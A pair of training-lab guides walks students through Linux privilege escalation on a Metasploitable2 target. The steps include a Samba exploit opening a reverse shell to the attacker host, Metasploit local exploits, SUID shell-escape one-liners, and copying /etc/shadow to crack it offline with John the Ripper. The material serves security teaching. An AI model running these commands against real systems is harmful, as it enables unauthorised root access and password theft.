n the previous modules, you learned about common Privilege Escalation techniques attackers use to elevate access within a compromised environment. This lab transitions you from **theory to practice**, providing a hands-on opportunity to perform escalation on a Linux target machine.

You will begin with limited shell access, simulating a post-exploitation scenario where your actions are restricted by the account's permissions. Your mission is to escalate privileges to **root**, granting unrestricted control over the machine.

To achieve this, you will follow a systematic workflow:

1. **Enumerate** vulnerabilities.
2. **Automate** exploitation attempts with Metasploit.
3. **Execute** selected exploits.
4. **Manually escalate** privileges using system misconfigurations.
5. **Extract credentials** for further access.
    

This process mirrors how professional penetration testers and adversaries operate in real-world engagements, making it a critical skill for both offensive and defensive practitioners.

## Lab objectives

Your key objectives in this lab are:

- **Enumeration:** Perform reconnaissance at the local system level to discover vulnerabilities and misconfigurations that may enable Privilege Escalation (e.g., Kernel version checks, SUID binary discovery, cron job inspection).
    
- **Automation:** Use Metasploit's `local_exploit_suggester` to analyze the target system and recommend applicable Privilege Escalation exploits.
    
- **Execution:** Select and run one of the suggested exploits to successfully escalate privileges and capture **Flag 3**.
    
- **Manual Escalation:** Without relying on automated tools, identify a viable misconfiguration (e.g., insecure SUID binary, world-writable script, or improperly configured cron job) and exploit it for escalation.
    
- **Credential Extraction:** Once root is obtained, extract password hashes from `/etc/shadow`, crack them offline using tools such as **John the Ripper** or **Hashcat**, and recover credentials for hidden or higher-privileged accounts. Capturing these credentials represents **Flag 4**.
--------
# LAB:
## Achieving Root Privileges: Automated with Metasploit

**Estimated time needed:** 30 minutes

## Overview

Privilege escalation is one of the most critical steps in a real-world compromise. Adversaries who start as unprivileged users often seek to become root or administrator, enabling full control over the system. In practice, this allows attackers to disable defenses, extract sensitive data, or deploy persistent backdoors. This lab shows how automated tools such as Metasploit streamline privilege escalation, and highlights why defenders must regularly patch kernels, audit permissions, and harden system configurations.

In this lab, you will escalate privileges from a limited user shell to root using automated exploitation techniques in Metasploit. You will first verify that you are operating from a non‑root session, collect system information, enumerate potential escalation vectors, and then use Metasploit's `local_exploit_suggester` to identify and run a privilege escalation exploit. Successful exploitation will yield root access.

> **Lab safety**: Use this only in the contained lab environment. Kernel exploits used here are highly dangerous on production systems.

## Learning objectives

After completing this lab, you will be able to:

- Verify your current user and confirm non‑root privileges
- Collect baseline system information to guide privilege escalation
- Run Metasploit's `local_exploit_suggester` and interpret results
- Select and configure an appropriate local privilege escalation exploit
- Verify successful root access

---

## Notes/assumptions

- Replace <MSF2_IP>, <KALI_IP>, and <KALI_LISTEN_PORT> with your actual addresses and port numbers. You can use the command: `ifconfig` on both environments to get their respective IP addresses.

## Exercise 0: Session verification and baseline checks

Use a Compatible Exploit and Payload, remember to change the details to match your own configuration.

1. `msfconsole -q`
2. `use exploit/multi/samba/usermap_script`
3. `set RHOSTS <MSF2_IP>`
4. `set RPORT 139`
5. `set PAYLOAD cmd/unix/reverse_netcat`
6. `set LHOST <Kali IP>`
7. `set LPORT 5555`
8. `run`
9. `su -s /bin/sh nobody`
  

10. Confirm you are operating from a **non‑root** session (Meterpreter or shell):
    
    1. `whoami`
    2. `id`
    

    ![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/Bw8eh9colav2PYZYIefvdQ/2-1.png)

**Expected Output:**

1. `daemon`
2. `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
### Why this step is important:

Privilege escalation assumes you begin with limited rights. Confirming your baseline ensures the exercise is valid.

2. Check persistence of your session (optional):
    
    1. `background`
    2. `y`
    3. `sessions`
    
### Why this step is important:

Listing active sessions ensures you know which session ID to use when configuring Metasploit exploits.

## Exercise 1: Collect system information

1. Gather kernel and OS version details:
    
    1. `sessions -i (Session ID)`
    2. `uname -a`
    3. `cat /etc/issue`
    
![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/bQRmeUnYoM-uCcHxlyX9FQ/8.png)
1. Enumerate SUID binaries (optional check):
    
    1. `find / -perm -4000 -type f 2>/dev/null | head -20`

2. Check `sudo` rights if available:
    
    1. `sudo -l`
### Why this step is important:

System and kernel version details guide exploit choice. SUID and sudo checks reveal manual escalation opportunities (covered in the next lab).
## Exercise 2: Launch Metasploit's Local Exploit Suggester

1. From a Meterpreter session, run the local exploit suggester:

2. `background`
3. `y`
4. `use post/multi/manage/shell_to_meterpreter`
5. `set SESSION 6       # (replace 6 with your session ID)`
6. `set LHOST <Kali IP>`
7. `set LPORT 5555`
8. `run`    

Exploit upgrades often fail intermittently. You might need to repeat creating a session and trying to upgrade it a few times as these shells are sometimes fragile.

1. `#Check the new session ID`
2. `sessions`

3. `#Interact with the upgreaded session`
4. `sessions -i 8     # (replace 8 with your session ID)`
5. `run post/multi/recon/local_exploit_suggester`

![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/IZ_dqZyhGa1tOtc2fxq7Jg/9.png)

**Expected Output (partial):**

1. `[*] Collecting local exploits for x86/linux...`
2. `[+] exploit/linux/local/dirty_cow: The target appears to be vulnerable.`
3. `[+] exploit/linux/local/service_privesc: The target appears to be vulnerable.`

### Why this step is important:

This module tests the current environment against a library of known privilege escalation exploits and lists those likely to succeed.

> **Troubleshooting:** If no exploits appear, ensure your session is active and valid. You may need to re‑run with a different payload or verify your session ID.

## Exercise 3: Select and configure an exploit

1. Choose the most reliable exploit from the suggester output (example: **Dirty COW**):
    
    1. `background`
    2. `use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc`
    3. `set SESSION 8  # (replace 8 with your session ID)`
    4. `set LHOST 192.168.1.55`
    5. `set LPORT 4444`
    6. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
    7. `exploit`


![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/pMciZpGceAwE5mdYQouzlQ/2.png)

**Expected Output:**

1. `msf6 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > exploit`
2. `[*] Started reverse TCP handler on 192.168.1.55:4444` 
3. `[+] The target appears to be vulnerable`
4. `[*] Using target: Linux x86`
5. `[*] Writing '/tmp/.QwGBLSgh' (1271 bytes) ...`
6. `[*] Writing '/tmp/.wvBEKx' (286 bytes) ...`
7. `[*] Writing '/tmp/.dgY4pKfE' (207 bytes) ...`
8. `[*] Launching exploit...`
9. `[*] Sending stage (1017704 bytes) to 192.168.1.49`
10. `[*] Meterpreter session 9 opened` 
### Why this step is important:

Running a tested exploit provides a high chance of escalating privileges automatically, saving time over manual enumeration.

> **Troubleshooting:** If the exploit fails, try another candidate from the suggester output (for example, `service_privesc`).

## Exercise 4: Verify root access

1. In the new session, confirm you are now root and get more system details:
    
    1. `getuid`
    2. `sysinfo`

**Expected Output:**

1. `meterpreter > getuid`
2. `Server username: root`
3. `meterpreter > sysinfo`
4. `Computer     : metasploitable.localdomain`
5. `OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)`
6. `Architecture : i686`
7. `BuildTuple   : i486-linux-musl`
8. `Meterpreter  : x86/linux`
9. `meterpreter >` 
### Why this step is important:

Confirming `uid=0(root)` validates that the privilege escalation was successful.

-------
# Lab2:
# Manual Privilege Escalation and Credential Dumping

**Estimated time needed:** 30 minutes

## Overview

While automated tools are convenient, skilled attackers often rely on manual techniques when exploit modules fail or defenses block automated flows. In this lab, you will: enumerate SUID binaries and other misconfigurations, abuse a common SUID program to obtain root, extract `/etc/shadow` hashes, transfer them safely to the attacker (Kali) VM, and crack them with John the Ripper—all.

> **Safety note:** Only perform these steps in a lab you own or have explicit permission to use. Running these techniques on production systems is illegal.

## Learning objectives

After completing this lab, you will be able to:

- Enumerate SUID binaries and identify likely escalation candidates
- Exploit common SUID misconfigurations (nmap, find, vim) to spawn a root shell
- Extract `/etc/shadow` securely and prepare it for offline cracking
- Combine `/etc/passwd` and `/etc/shadow` using `unshadow` so John can crack hashes
- Crack hashes with John the Ripper and document findings for reporting

---

## Prerequisites

- You must already have a limited shell or Meterpreter session on the target (from labs [Initial Access and Exploitation](https://cf-courses-data.static.labs.skills.network/e0gfUoh-0X7Jvx6GvxFuXA/Initial%20Access%20and%20Exploitation-v1.md.html) and [Service-Specific Exploitation Challenge](https://cf-courses-data.static.labs.skills.network/bKsgVRcz1EXQzMIC23hD_Q/Service-Specific%20Exploitation%20Challenge-v1.md.html)). Replace `<TARGET_IP>` and `<KALI_IP>` with actual addresses.
    
- All commands that require root on the target use `sudo` or are executed after you obtain a root shell.
    

---

## Exercise 1: Confirm current user and enumerate SUID binaries

1. Confirm you are a non-root user:

2. `ssh -oHostKeyAlgorithms=+ssh-rsa \`
3.     `-oPubkeyAcceptedAlgorithms=+ssh-rsa \`
4.     `-oPubkeyAcceptedKeyTypes=+ssh-rsa \`
5.     `msfadmin@<MSF2_IP>`    

          

        

Password: msfadmin

1. `whoami`
2. `id`

          

        

If SSH refused, please see the next troubleshooting exercise.

![](https://cf-courses-data.s3.us.cloud-object-storage.appdomain.cloud/IsdMpy1sVWLRDQ5HskeYTw/3.png)

2. Enumerate SUID binaries (run this from the target shell):

3. `# find all SUID files and save to a file for reporting`
4. `sudo find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_list.txt`
5. `# quick grep for known risky programs`
6. `sudo find / -perm -4000 -type f 2>/dev/null | egrep "(nmap|find|vim|less|nano|perl|python|sh)" | sort -u`

          

        

**Expected output (excerpt):**

1. `/usr/bin/chsh`
2. `/usr/bin/netkit-rsh`
3. `/usr/bin/nmap`
4. `/usr/lib/openssh/ssh-keysign`

          

        

### Why this step is important:

SUID programs run with the file owner's privileges (often root). Some SUID apps can be abused to execute arbitrary commands as root.

> **Evidence tip:** Save `/tmp/suid_list.txt`—you will include it in the final incident report.

## Troubleshooting Exercise — SSH refused: quick troubleshooting

Context: If your `ssh` attempt to the Metasploitable2 target returns _Connection refused_, follow these steps to diagnose and fix the problem. Replace `<container>` and `<container_ip>` with the container name (example `metasploitable2`) and IP (example `172.18.0.2`) shown by `docker inspect`.

Step 1 - Confirm container status & IP

```
1. `# list running containers and names`
2. `sudo docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"`

3. `# get the container IP (replace <container>)`
4. `sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container>`
```

Step 2 - Check container logs for sshd errors

```
1. `sudo docker logs <container> --tail 200`
```
Step 3 - Exec into the container and check sshd

```
1. `# open an interactive shell (replace <container>)`
2. `sudo docker exec -it <container> /bin/bash`

3. `# inside the container, check sshd`
4. `ps aux | grep -E 'sshd|ssh'`
5. `ss -tlnp | grep :22 || netstat -tlnp | grep :22`

6. `# if sshd is stopped, try starting it`
7. `service ssh start || /etc/init.d/ssh start || /usr/sbin/sshd -D &`
```

Step 4 - Confirm host-side port mappings (if you expect to connect via host)

```
1. `# show port mappings for <container>`
2. `sudo docker port <container>`

3. `# view full port JSON if needed`
4. `sudo docker inspect -f '{{json .NetworkSettings.Ports}}' <container> | jq .`
```
Step 5 - Re-scan from Kali and test
```

1. `# from Kali host`
2. `sudo nmap -Pn -sV -p22 <container_ip>`
3. `nc -v -z <container_ip> 22`
4. `# or test via host mapping if container exposes host port 2222:`
5. `ssh -p 2222 msfadmin@localhost`
```
Step 6 - If SSH remains refused

```
 Restart the container: `sudo docker restart <container>` then repeat Steps 2–5.
- If the container does not expose port 22 on the host and you prefer host access, recreate with port mapping:  
    `sudo docker run -d --name metasploitable2 -p 2222:22 <metasploitable-image>` and then `ssh -p 2222 msfadmin@localhost`.
- If you cannot `exec` into the container, check host firewall/iptables: `sudo iptables -L -n` or `sudo nft list ruleset`.

**Do not repeatedly hammer the SSH port. If attempts fail more than 5 times, collect container logs and notify the instructor with the logs and the output of `docker inspect` for troubleshooting.**

Example (for this lab): if your container name is `metasploitable2` and IP is `172.18.0.2`, run the commands above replacing `<container>` with `metasploitable2` and `<container_ip>` with `172.18.0.2`.

```


---

## Exercise 2: Exploit a vulnerable SUID binary (nmap example)

> Use these steps if `/usr/bin/nmap` is SUID.

1. Start nmap in interactive mode on the target:

2. `# On the target shell (as your limited user)`
3. `nmap --interactive`


4. At the `nmap>` prompt, spawn a shell:

5. `nmap> !sh`
6. `# now you are in a shell; verify:`
7. `whoami`
8. `id`

**Expected output:**

1. `root`
2. `uid=0(root) gid=0(root) groups=0(root)`

### Alternatives (if nmap is not SUID)

- `find` abuse (if `find` is SUID):

1. `# from the directory you control:`
2. `find . -exec /bin/sh -p \; -quit`

- `vim` abuse (if `vim` is SUID):

1. `vim -c ':shell'`

- `less` abuse:

1. `less /etc/hosts`
2. `!sh`
### Why this step is important:

Abusing a misconfigured SUID binary can give immediate root without kernel exploits.

> **Troubleshooting:** If the SUID binary does not spawn a root shell, verify the binary is indeed SUID (`ls -l /usr/bin/nmap` should show an `s` in owner perms) and that the binary is executable. Some lab images may not have SUID nmap; if so, pick the next candidate.

---

## Exercise 3: Baseline and secure evidence capture (once root)

1. After gaining root, collect quick host facts:

2. `whoami`
3. `id`
4. `uname -a`
5. `cat /etc/issue`
6. `date`
7. `ps aux --sort=-%mem | head -n 10`
8. `ss -plnt || netstat -plnt`
9. Save outputs for the report:

10. `mkdir -p /tmp/evidence && whoami > /tmp/evidence/whoami.txt && uname -a > /tmp/evidence/uname.txt && ps aux | head -n 50 > /tmp/evidence/ps.txt`

### Why this step is important:

A minimal set of artifacts (whoami, uname, process list) documents your point-in-time root access for the incident report.

---

## Exercise 4: Extract `/etc/shadow` safely on the target

**Important:** Do not display all hashes on screen in shared environments. Save a copy, restrict permissions, and transfer securely.

1. Create a restricted copy of `/etc/shadow` on the target:

2. `sudo cp /etc/shadow /tmp/shadow_copy`
3. `sudo chmod 600 /tmp/shadow_copy`
4. `sudo chown root:root /tmp/shadow_copy`
5. Also save a copy of `/etc/passwd` (needed for `unshadow`):
6. `sudo cp /etc/passwd /tmp/passwd_copy`
7. `sudo chmod 644 /tmp/passwd_copy`
8. (Optional) Extract only specific user lines to limit exposure:

9. `# example: extract lines for user1 and root only`
10. `sudo egrep '^root:|^user1:' /etc/shadow > /tmp/shadow_selected`
11. `sudo chmod 600 /tmp/shadow_selected`

### Why this step is important:

Keeping a local copy with tight permissions reduces accidental exposure. You will transfer these copies off the target for offline cracking.

---

## Exercise 5: Transfer hashes to the attacker (Kali)

Choose one of these secure transfer methods. On the Kali machine, create a directory to receive the files:

1. `mkdir -p ~/ctf_evidence/target_<TARGET_IP>`

**Option A: Use `scp` from Kali (pull method, recommended):**

1. `# from Kali, pull files (replace <TARGET_IP>)`
2. `scp root@<TARGET_IP>:/tmp/shadow_copy ~/ctf_evidence/target_<TARGET_IP>/shadow_copy`
3. `scp root@<TARGET_IP>:/tmp/passwd_copy ~/ctf_evidence/target_<TARGET_IP>/passwd_copy`

**Option B: Use Python HTTP server on Kali, then `wget` from target (push method):**

1. `# on Kali (in ~/ctf_evidence/target_<TARGET_IP>)`
2. `python3 -m http.server 8000`
3. `# on target (root)`
4. `wget http://<KALI_IP>:8000/shadow_copy -O /tmp/shadow_pull`

> If `scp` fails because root SSH is disabled, you can `tar` the files and move them via `socat` or copy the content into a temporary file and paste into a secure channel—but `scp` from Kali (pull) is usually easiest when you have root.

---

## Exercise 6: Prepare an unshadowed file for John on Kali

John expects an unshadowed file combining `/etc/passwd` and `/etc/shadow`. On Kali:

1. Ensure you have both files in your Kali receiving folder:

2. `~/ctf_evidence/target_<TARGET_IP>/shadow_copy`
3. `~/ctf_evidence/target_<TARGET_IP>/passwd_copy`

4. Use `unshadow` (part of John) to combine:

5. `cd ~/ctf_evidence/target_<TARGET_IP>`
6. `sudo unshadow passwd_copy shadow_copy > target_unshadowed.txt`
7. `# verify`
8. `file target_unshadowed.txt`
9. `wc -l target_unshadowed.txt`

### Why this step is important:

`unshadow` creates the correct format John needs to attempt cracking.

---

## Exercise 7: Crack hashes with John the Ripper

1. Run John using a wordlist (e.g., `rockyou.txt`):

2. `# example run (may take time depending on hash strength)`
3. `john --wordlist=/usr/share/wordlists/rockyou.txt target_unshadowed.txt --pot=ctf_john.pot`
4. `# monitor progress`
5. `john --status`
6. Show cracked passwords:
7. `john --show --pot=ctf_john.pot target_unshadowed.txt`

**Expected output (example):**

1. `user1:password123`
2. `root:toor`


### Why this step is important:

Recovered credentials demonstrate how attackers move from hashed secrets to usable accounts for lateral movement.

> **Tip:** If John shows no results, try `--incremental` or use other wordlists/rules. For stronger hashes (bcrypt, argon2), John may not crack them within lab time—document this in the report.

---

## Cleanup (important for shared labs)

1. Remove copied files on the target:

2. `sudo shred -u /tmp/shadow_copy 2>/dev/null || sudo rm -f /tmp/shadow_copy`
3. `sudo rm -f /tmp/passwd_copy /tmp/shadow_selected`
4. `sudo rm -rf /tmp/evidence`

5. Remove files on Kali (if desired):

6. `rm -f ~/ctf_evidence/target_<TARGET_IP>/shadow_copy`
7. `rm -f ~/ctf_evidence/target_<TARGET_IP>/passwd_copy`
8. `rm -f ~/ctf_evidence/target_<TARGET_IP>/target_unshadowed.txt`

---

## Troubleshooting and notes

- If `nmap` or `vim` are not SUID on your target image, pick another SUID candidate from `/tmp/suid_list.txt`. Not all images include every vulnerable SUID binary.
    
- If you cannot get `scp` to pull files, verify the target's SSH configuration (root login may be disabled)—you can instead create a limited extract (`egrep` of lines) and paste that into a local file for cracking, but document the reason in your evidence.
    
- If John cannot crack hashes in reasonable time, record the hash type and comment on the strength (e.g., SHA-512 with salt)—this is a valid finding for the final report.
- 